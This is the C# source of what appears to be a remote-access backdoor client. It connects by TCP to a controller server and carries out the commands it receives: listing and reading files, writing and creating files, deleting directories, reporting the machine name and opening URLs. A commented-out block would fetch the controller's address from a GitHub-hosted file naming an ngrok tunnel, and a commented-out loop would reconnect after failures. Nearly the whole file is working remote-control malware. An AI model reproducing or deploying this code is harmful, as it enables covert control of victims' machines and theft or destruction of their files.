using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace clin;

internal class Pro
{
    private static string host = "127.0.0.1";

    private static int port = 25565;
    static string direct_work = "C:\\";

    private static void Main()
    {

    A:
      /*  using (WebClient client = new WebClient()) 
        {
          string file =  client.DownloadString("https://raw.githubusercontent.com/pag6666/ngrok_file/main/ngrok_server_connection");
            string[]arr= file.Split(':');
            host = arr[0];
            port = int.Parse(arr[1]);

        }*/
            //try {
            string ClientCommannds(string command, Stream stream)
            {

                string[] helper = new string[] { "nano$ --path $ --text", "open$ --path", "cat$ --path", "help", "username", "browser_open$ --Uri", "clear", "cd$ --path", "cd..", "ls", "now_cd", "l", "mkdir$ --path", "rmdir$ --path" };
                string requst = "null";
                string[] parse_comamnd = command.Split("$");
                command = parse_comamnd[0];
                command = command.ToLower().Trim();
                string select_dir = "empty";
                string select_file = "empty.txt";
                switch (command)
                {
                    case "": requst = "empty"; break;
                    case "help":
                        {
                            requst = "";
                            string[] array = helper;
                            foreach (string i in array)
                            {
                                requst = requst + "command - " + i + "\n";
                            }
                            break;
                        }
                    case "username":
                        requst = Environment.MachineName;
                        break;
                    case "browser_open":
                        {
                            string answer2 = "empty";
                            if (parse_comamnd.Length > 0)
                            {
                                answer2 = parse_comamnd[1];
                            }
                            else
                            {
                                requst = "argument 1?";
                            }


                            if (Uri.TryCreate(answer2, UriKind.Absolute, out Uri uri))
                            {
                                ProcessStartInfo psInfo = new ProcessStartInfo
                                {
                                    FileName = answer2.Trim(),
                                    UseShellExecute = true
                                };
                                Process.Start(psInfo);
                                requst = "success";
                            }
                            else
                            {

                                requst = $"|{answer2}|";
                            }


                            break;
                        }
                    case "l":
                        string temp_dir3 = "| File: ";
                        string[] files2 = Directory.GetFiles(direct_work);
                        foreach (string j in files2)
                        {
                            temp_dir3 = temp_dir3 + "# " + j + " #";
                        }
                        temp_dir3 += "\n";
                        temp_dir3 += "| Direst: ";
                        string[] directories2 = Directory.GetDirectories(direct_work);
                        foreach (string k in directories2)
                        {
                            temp_dir3 = temp_dir3 + "| " + k + " |";
                        }
                        temp_dir3 += "\n";
                        requst = temp_dir3;
                        break;
                    case "cd":

                        if (parse_comamnd.Length > 1)
                        {
                            select_dir = parse_comamnd[1];
                        }

                        if (Directory.Exists(direct_work + select_dir))
                        {
                            requst = "open dir";
                            direct_work += select_dir+"\\";
                        }
                        else
                        {
                            requst = "not dir";
                        }
                        if (Directory.Exists(select_dir))
                        {
                            direct_work = select_dir + "\\";
                            requst = "open dir";
                        }

                        break;
                    case "ls":
                        {
                            string temp_dir = "# File: ";
                            string[] files = Directory.GetFiles(direct_work);
                            foreach (string j in files)
                            {
                                temp_dir = temp_dir + "# " + j.Split("\\")[j.Split("\\").Length - 1] + " #";
                            }
                            temp_dir += "\n";
                            temp_dir += "| Direst: ";
                            string[] directories = Directory.GetDirectories(direct_work);
                            foreach (string k in directories)
                            {
                                temp_dir = temp_dir + "| " + k.Split("\\")[k.Split("\\").Length - 1] + " |";
                            }
                            temp_dir += "\n";
                            requst = temp_dir;
                            break;
                        }
                    case "cd..":
                        string temp_dir2 = "";
                        string[] parse_sh = direct_work.Split("\\");
                        if (parse_sh.Length > 0)
                        {
                            for (int i = 0; i < parse_sh.Length - 1; i++)
                            {
                                if (i < parse_sh.Length) {
                                    temp_dir2 += $"{parse_sh[i]}\\";
                                }
                            }
                            direct_work = temp_dir2;
                            requst = temp_dir2;
                        }
                        break;
                    case "now_cd":
                        requst = direct_work;
                        break;
                    case "test":
                        requst = "test";
                        break;
                    case "mkdir":
                        if (parse_comamnd.Length > 0)
                        {
                            select_dir = parse_comamnd[1];
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        Directory.CreateDirectory($"{direct_work}{select_dir.Trim()}\\").Create();
                        break;
                    case "rmdir":
                        if (parse_comamnd.Length > 0)
                        {
                            select_dir = parse_comamnd[1];
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        Directory.Delete($"{direct_work}{select_dir.Trim()}\\");
                        break;
                    case "open":
                        if (parse_comamnd.Length > 0)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        if (File.Exists(direct_work + select_file))
                        {
                            requst = "open file";
                            Process.Start("notepad.exe", direct_work + select_file);
                        }
                        else
                        {
                            requst = "file not exists";
                        }
                        break;
                    case "cat":
                        if (parse_comamnd.Length > 0)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        if (File.Exists(direct_work + select_file))
                        {
                            string file = File.ReadAllText(direct_work + select_file);
                            if (file?.Trim().Length > 0 && file != null)
                            {
                                requst = $"\n############################\n{file}\n############################\n";
                            }
                            else
                            {
                                requst = "file empty";
                            }
                        }
                        break;
                    case "nano":
                        if (parse_comamnd.Length > 0)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        
                        if (parse_comamnd.Length > 1)
                        {
                        if (File.Exists(direct_work + select_file))
                        {
                            File.WriteAllText(direct_work + select_file, parse_comamnd[2].Trim());
                            requst = "save text";
                        }
                        else 
                        {
                          
                            if (Directory.Exists(direct_work)) {
                             
                                File.Create(direct_work +select_file).Close(); 
                                
                                File.WriteAllText(direct_work+ select_file, parse_comamnd[2].Trim());
                            }
                            requst = "save text";
                        }
                        }
                        else
                        {
                            requst = "argument 2?";
                        }
                        break;
                    default:
                        requst = "Client: the command was not found"; break;


                }
                return requst;
            }
            string Read(Stream stream)
            {
                string requst = "nullread";
                byte[] buffer = new byte[1024];
                int size = stream.Read(buffer, 0, buffer.Length);
                requst = Encoding.UTF8.GetString(buffer, 0, size);
                return requst;
            }
            void Write(Stream stream, string text)
            {
                byte[] buffer = Encoding.UTF8.GetBytes(text);
                stream.Write(buffer, 0, buffer.Length);
                stream.Flush();
            }
            using (TcpClient client = new TcpClient(host, port))
            {
                using Stream stream = client.GetStream();
                while (true)
                {
                    string order = Read(stream);
                    Console.WriteLine(order);
                    string answer = "null answer";
                    if (order.Trim().Length > 0 && order != null)
                    {
                        answer = ClientCommannds(order, stream);
                    }
                    Write(stream, answer);
                }
            }

           /* }
        catch(Exception e)
        {
            Console.WriteLine(e.Message);
            Thread.Sleep(5000);
            goto A;
        }
*/
        }
}
